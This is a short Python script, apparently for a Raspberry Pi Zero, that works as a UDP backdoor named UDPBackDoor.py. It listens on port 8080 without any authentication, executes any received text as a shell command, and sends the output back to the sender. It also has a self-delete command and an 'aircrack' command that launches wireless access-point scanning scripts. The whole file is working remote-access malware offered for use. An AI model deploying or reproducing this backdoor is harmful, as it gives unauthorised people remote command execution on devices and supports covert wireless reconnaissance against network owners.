import socket 
import os
import sys
import time

#Define the Address of the server
ServerIP = '' #The default address of the pi Zero 
ServerPort = 8080 #The default port of the pi Zero
ServerAddress = (ServerIP, ServerPort)
byts1 = 4096
byts2 = 1024

#Create and bind the socket 
UDPSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
UDPSocket.bind(ServerAddress)

#Wait for Incomming Data
while True:
    datastream, client_addr = UDPSocket.recvfrom(byts1)
   
    #If there is a connection and it does recieve some datam decode the data 
    if datastream:
        print('Connection Established. Client:=> ', client_addr)
        print('Decoding the data now....')
        DecodeStream = datastream.decode('utf-8')
        #Respond appropriately
        if DecodeStream == "exit":
            UDPSocket.close()
            
        elif DecodeStream == "del backdoor":
            UDPSocket.close()
            os.system("del UDPBackDoor.py")

        elif DecodeStream == "aircrack":
            #Run the aircrack command bash script and scan for access points nearby
            os.system("./Aircrack_ng.sh")

            #After 10 seconds of scanning, the airmon-ng kill script will run, setting the NIC of the pi
            #Backed to managed mode. This will enable the pi to reconnect to the same network it was disconneted from 
            time.sleep(10)
            os.system("./Airmon_ngStop.sh")

                
        else:
            #By default we will run the commmand in the terminal
            #The output gets saved to a text file and sent back to the client
            #The text file is then read to the client, where we can see the output
            
            #Run the command in the terminal from the data sent from the client
            Command = DecodeStream + " > Command.txt"
            os.system(Command)

            #Prep the file for sending
            FileName = "Command.txt"
            ReadFileData = open(FileName, 'rb')
            ReadFileBytes = ReadFileData.read(1024)
            while ReadFileBytes:
                UDPSocket.sendto(ReadFileBytes, client_addr)
                ReadFileBytes = ReadFileData.read(1024)
            ReadFileData.close()

            #The system will sleep for 10 seconds
            time.sleep(10)

            
                



